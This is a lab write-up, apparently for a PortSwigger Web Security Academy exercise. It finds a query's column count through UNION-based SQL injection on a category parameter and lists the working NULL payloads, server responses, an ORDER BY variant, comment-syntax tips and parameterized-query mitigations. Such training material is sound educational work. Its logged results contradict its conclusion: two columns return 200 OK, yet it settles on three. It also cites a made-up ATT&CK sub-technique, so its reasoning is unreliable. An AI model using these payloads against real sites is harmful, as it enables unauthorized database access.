# SQL Injection - UNION Attack: Identify Column Count

## Goal:
This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables.

To solve the lab, determine the number of columns returned by the query by performing a SQL injection UNION attack that returns an additional row containing null values.

---

## Vulnerability Analysis

### Attack Vector Identification
- **Entry Point**: `category` parameter in GET request
- **Vulnerability Type**: T1190.001 - SQL Injection: UNION Column Enumeration (CWE-89)
- **Security Flaw:** User input is embedded directly into SQL queries

### Vulnerability Assessment & Exploitation

**Initial Approach:**
- Intercepted HTTP requests using Burp Suite
- Identified category parameter as potential injection point
- Performed systematic input validation testing

**Step 1: Testing UNION Injection**

**Testing with 1 column:**
```sql
' UNION SELECT NULL--
```
Response: HTTP/2 500 Internal Server Error

**Testing with 2 columns:**
```sql
' UNION SELECT NULL,NULL--
```
Response: HTTP/2 200 OK

**Testing with 3 columns:**
```sql
' UNION SELECT NULL,NULL,NULL--
```
Response: HTTP/2 200 OK

This loaded the webpage normally, indicating the original query returns 3 columns, and the payload now matches that structure.

**Step 2: Understanding the Injection**

`' UNION SELECT NULL,NULL,NULL--` closes the string with `'`, adds a `UNION SELECT` clause with 3 columns (`NULL,NULL,NULL`), comments out the rest of the query using `--`.

**The SQL query becomes:**
```sql
SELECT * FROM products WHERE category = 'Corporate gifts' UNION SELECT NULL,NULL,NULL--' AND released = 1
```

Now the injected query structure is valid (matches the original query structure), and the page loads correctly.

---

## Security Assessment

### Root Cause Analysis
- Application concatenates user input directly into SQL queries
- No input validation or sanitization implemented
- Parameterized queries (prepared statements) are not used

### Risk Assessment
| Category | Impact |
|----------|--------|
| Information Disclosure | High – Database structure exposed |
| Data Access | High – Potential access to other tables |
| Query Manipulation | High – UNION attacks possible |

---

## Mitigation

- Use parameterized queries (prepared statements) instead of building SQL statements with user input. This prevents user-controlled input from being executed as SQL code.

Check syntax [here](/PortSwigger-web-security-academy/SQL-injection/01-sqli-where-clause.md#mitigation)

- Restrict database permissions using the principle of least privilege.

---

## Reflection

This lab demonstrated the first step of a UNION-based SQL injection: determining the number of columns required for a valid `UNION SELECT` query. The systematic testing with increasing NULL values proved highly effective in identifying the correct column count. Learned the importance of understanding query structure for successful UNION attacks.

---

## Notes

`ORDER BY 1`, `ORDER BY 2`, etc., can also be used to determine the column count. However, when using ORDER BY, the page loads normally until the number exceeds the actual column count — then it shows an error.

`--` comments out the rest of the query. On MySQL, `--` should be followed by a space. Alternatively, `#` can also be used to identify a comment.

[SQLi cheatsheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)

---